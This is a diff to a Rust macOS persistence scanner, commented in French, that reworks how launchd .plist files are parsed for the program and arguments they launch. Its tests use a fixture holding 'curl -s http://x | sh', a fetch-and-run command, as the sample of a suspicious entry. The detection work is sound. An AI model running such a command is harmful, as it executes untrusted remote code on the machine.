@@ -4,41 +4,46 @@
 use std::path::{Path, PathBuf};
 
 use super::super::{Constat, alerte, ok};
+use crate::plist::Valeur;
 use crate::risk::Niveau;
 use crate::{tr, trf};
 
 const CAT: &str = "Persistance";
 
-/// Programme lancé par un .plist de launchd (Program, ou premier élément de ProgramArguments), et ses arguments.
-/// Les .plist binaires sont convertis en XML par plutil.
+/// Programme lancé par un .plist de launchd, et ses arguments. Le fichier est lu directement ; plutil ne sert qu'en
+/// secours, pour un format que le lecteur ne connaît pas. Un fichier qui n'en est pas un (tube nommé) est sauté.
 fn programme(plist: &Path) -> Option<(String, String)> {
-    let r = crate::commande::lancer(
-        std::process::Command::new("plutil")
-            .args(["-convert", "xml1", "-o", "-"])
-            .arg(plist),
-        10,
-    )?;
-    lire_programme(&r.sortie)
+    let reglages = if let Some(r) = crate::plist::lire_fichier(plist).ok()? {
+        r
+    } else {
+        let r = crate::commande::lancer(
+            std::process::Command::new("plutil")
+                .args(["-convert", "xml1", "-o", "-"])
+                .arg(plist),
+            10,
+        )?;
+        crate::plist::lire(r.sortie.as_bytes())?
+    };
+    lire_programme(&reglages)
 }
 
-/// Lit Program / ProgramArguments dans un plist XML.
-fn lire_programme(xml: &str) -> Option<(String, String)> {
-    let chaine = |apres: &str| -> Option<String> {
-        let debut = apres.find("<string>")? + "<string>".len();
-        let fin = apres[debut..].find("</string>")? + debut;
-        Some(apres[debut..fin].trim().to_string())
+/// Program, ou à défaut le premier élément de ProgramArguments ; les arguments sont ceux de ProgramArguments après
+/// le premier (launchd les passe aussi quand Program est donné, le premier faisant office de nom).
+fn lire_programme(reglages: &Valeur) -> Option<(String, String)> {
+    let elements: Vec<&str> = reglages
+        .cle("ProgramArguments")
+        .and_then(Valeur::tableau)
+        .unwrap_or_default()
+        .iter()
+        .filter_map(Valeur::texte)
+        .map(str::trim)
+        .collect();
+    let arguments = elements.get(1..).unwrap_or_default().join(" ");
+    let programme = match reglages.cle("Program").and_then(Valeur::texte) {
+        Some(p) => p.trim(),
+        None => elements.first()?,
     };
-    if let Some((_, apres)) = xml.split_once("<key>Program</key>") {
-        return Some((chaine(apres)?, String::new()));
-    }
-    let (_, apres) = xml.split_once("<key>ProgramArguments</key>")?;
-    let tableau = apres.split_once("</array>")?.0;
-    let mut elements = tableau
-        .split("<string>")
-        .skip(1)
-        .filter_map(|e| e.split_once("</string>").map(|(v, _)| v.trim().to_string()));
-    let premier = elements.next()?;
-    Some((premier, elements.collect::<Vec<_>>().join(" ")))
+    Some((programme.to_string(), arguments))
 }
 
 /// Ce qui rend un lancement suspect : dossier temporaire ou caché, script qui télécharge ou décode du code.
@@ -176,16 +181,28 @@ mod tests {
 
     #[test]
     fn lecture_des_plist() {
-        let simple = "<dict><key>Label</key><string>com.ex.a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string></dict>";
+        let lire = |corps: &str| {
+            let xml = format!("<?xml version=\"1.0\"?><plist version=\"1.0\"><dict>{corps}</dict></plist>");
+            lire_programme(&crate::plist::lire(xml.as_bytes()).unwrap())
+        };
         assert_eq!(
-            lire_programme(simple),
+            lire(
+                "<key>Label</key><string>com.ex.a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string>"
+            ),
             Some(("/Applications/A.app/Contents/MacOS/a".into(), String::new()))
         );
         let args = "<key>ProgramArguments</key>\n<array>\n\t<string>/bin/bash</string>\n\t<string>-c</string>\n\t<string>curl -s http://x | sh</string>\n</array>";
         assert_eq!(
-            lire_programme(args),
+            lire(args),
             Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
         );
+        // Program et ProgramArguments ensemble : les arguments comptent aussi.
+        let ensemble = format!("<key>Program</key><string>/bin/bash</string>{args}");
+        assert_eq!(
+            lire(&ensemble),
+            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
+        );
+        assert_eq!(lire("<key>Label</key><string>com.ex.a</string>"), None);
     }
 
     #[test]
